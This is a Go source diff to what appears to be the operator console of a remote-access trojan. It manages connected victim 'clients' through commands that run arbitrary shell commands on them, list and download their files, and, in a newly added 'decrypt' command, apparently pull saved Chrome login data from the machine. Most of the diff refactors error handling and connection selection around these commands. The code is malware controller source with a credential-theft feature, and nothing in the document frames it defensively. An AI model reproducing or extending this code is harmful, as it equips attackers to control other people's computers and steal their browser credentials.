@@ -15,20 +15,33 @@ type Command struct {
 	Description    string
 	Args           []string
 	RequiredClient bool
-	Func           func(args []string)
+	Func           func(args []string) error
 }
 
 var commands []Command
 
-func (command Command) Execute(args []string) {
-	if command.RequiredClient && (selectedClient.Conn == nil || !selectedClient.Connected) {
-		log.Errorf("No client selected!")
+func (command *Command) Execute(args []string) {
+	if command.RequiredClient && (!selectedClient.Connected || (selectedClient.Conn != nil && !connections[selectedClient.Addr].Connected)) {
+		log.Errorf("No client selected or client is disconnected!")
 		return
 	}
-	command.Func(args)
+
+	if selectedClient.Conn != nil {
+		client := connections[selectedClient.Addr]
+
+		// update every execution because client can disconnect
+		if command.RequiredClient && strings.HasPrefix(selectedClient.Addr, client.Addr) {
+			selectedClient = client
+		}
+	}
+
+	err := command.Func(args)
+	if err != nil {
+		log.Errorf("Failed to execute command: %v", err)
+	}
 }
 
-func RegisterCommand(name, description string, args []string, requiredClient bool, function func(args []string)) {
+func RegisterCommand(name, description string, args []string, requiredClient bool, function func(args []string) error) {
 	command := Command{
 		Name:           name,
 		Description:    description,
@@ -57,12 +70,17 @@ func ParseCommand(commandName string, args []string) {
 		log.Errorf("Error while parsing command: %v", err)
 		return
 	}
+	if command.Args != nil && len(args) < len(command.Args) {
+		log.Errorf("Missing arguments [%s] for command %s", strings.Join(command.Args[len(args):], ", "), commandName)
+		return
+	}
 	command.Execute(args)
 }
 
 func CommandLine() {
 	scanner := bufio.NewScanner(os.Stdin)
-	for scanner.Scan() {
+	for {
+		scanner.Scan()
 		split := strings.Split(scanner.Text(), " ")
 
 		commandName := split[0]
@@ -73,7 +91,7 @@ func CommandLine() {
 }
 
 func RegisterCommands() {
-	RegisterCommand("help", "Prints help", []string{}, false, func(args []string) {
+	RegisterCommand("help", "Prints help", []string{}, false, func(args []string) error {
 		log.Infof("Available commands:")
 		for _, command := range commands {
 			if len(command.Args) == 0 {
@@ -82,23 +100,21 @@ func RegisterCommands() {
 				log.Infof("%s [%s] - %s", command.Name, strings.Join(command.Args, " "), command.Description)
 			}
 		}
+		return nil
 	})
-	RegisterCommand("exit", "Exits the program", []string{}, false, func(args []string) {
+	RegisterCommand("exit", "Exits the program", []string{}, false, func(args []string) error {
 		log.Info("Exiting...")
 		os.Exit(0)
+		return nil
 	})
-	RegisterCommand("cmd", "Executes a command", []string{"command"}, true, func(args []string) {
-		if len(args) == 0 {
-			log.Errorf("No command provided")
-			return
-		}
-
+	RegisterCommand("cmd", "Executes a command", []string{"command"}, true, func(args []string) error {
 		selectedClient.SendData("cmd " + strings.Join(args, " "))
+		return nil
 	})
-	RegisterCommand("connections", "Lists all connections", []string{}, true, func(args []string) {
+	RegisterCommand("connections", "Lists all connections", []string{}, false, func(args []string) error {
 		if len(connections) == 0 {
 			log.Infof("No connections")
-			return
+			return nil
 		}
 
 		index := 0
@@ -110,56 +126,49 @@ func RegisterCommands() {
 				status = "disconnected"
 			}
 
-			log.Infof("[%s] Connection: %s | Status: %s", strconv.Itoa(index), connection.Conn.RemoteAddr(), status)
+			log.Infof("[%s] Connection: %s | Status: %s", strconv.Itoa(index), connection.Addr, status)
 			index++
 		}
+		return nil
 	})
-	RegisterCommand("files", "Lists all files in the current directory", []string{"directory"}, true, func(args []string) {
-		if len(args) != 1 {
-			log.Errorf("No directory provided")
-			return
-		}
-
+	RegisterCommand("files", "Lists all files in the current directory", []string{"directory"}, true, func(args []string) error {
 		selectedClient.SendData("files " + args[0])
+		return nil
 	})
-	RegisterCommand("download", "Downloads a file", []string{"file"}, true, func(args []string) {
-		if len(args) != 1 {
-			log.Errorf("No file provided")
-			return
-		}
-
+	RegisterCommand("download", "Downloads a file", []string{"file"}, true, func(args []string) error {
 		selectedClient.SendData("download " + args[0])
+		return nil
 	})
-	RegisterCommand("select", "Selects a connection", []string{"connection"}, false, func(args []string) {
-		if len(args) != 1 {
-			log.Errorf("No connection provided")
-			return
-		}
-
+	RegisterCommand("select", "Selects a connection", []string{"connection"}, false, func(args []string) error {
 		index, err := strconv.Atoi(args[0])
-		if err != nil {
-			log.Errorf("Invalid connection index")
-			return
-		}
-
-		if index >= len(connections) {
-			log.Errorf("Invalid connection index")
-			return
+		if err != nil || index < 0 || index >= len(connections) {
+			return fmt.Errorf("invalid connection index")
 		}
 
 		i := 0
 		for s := range connections {
-			if i == index {
-				if connections[s].Connected == false {
-					log.Errorf("Connection is not connected")
-					return
-				}
-
-				selectedClient = connections[s]
-				log.Infof("Selected connection %s", selectedClient.Conn.RemoteAddr())
-				return
+			if i != index {
+				i++
+				continue
 			}
-			i++
+
+			if connections[s].Connected == false {
+				return fmt.Errorf("connection is not connected")
+			}
+
+			selectedClient = connections[s]
+			log.Infof("Selected connection %s", selectedClient.Addr)
+			_, _ = SetTitle("Selected connection: " + selectedClient.Addr)
 		}
+
+		return nil
+	})
+	RegisterCommand("clear", "Clears the screen", []string{}, false, func(args []string) error {
+		CallClear()
+		return nil
+	})
+	RegisterCommand("decrypt", "Decrypt chrome data", []string{"login"}, true, func(args []string) error {
+		selectedClient.SendData("decrypt " + args[0])
+		return nil
 	})
 }
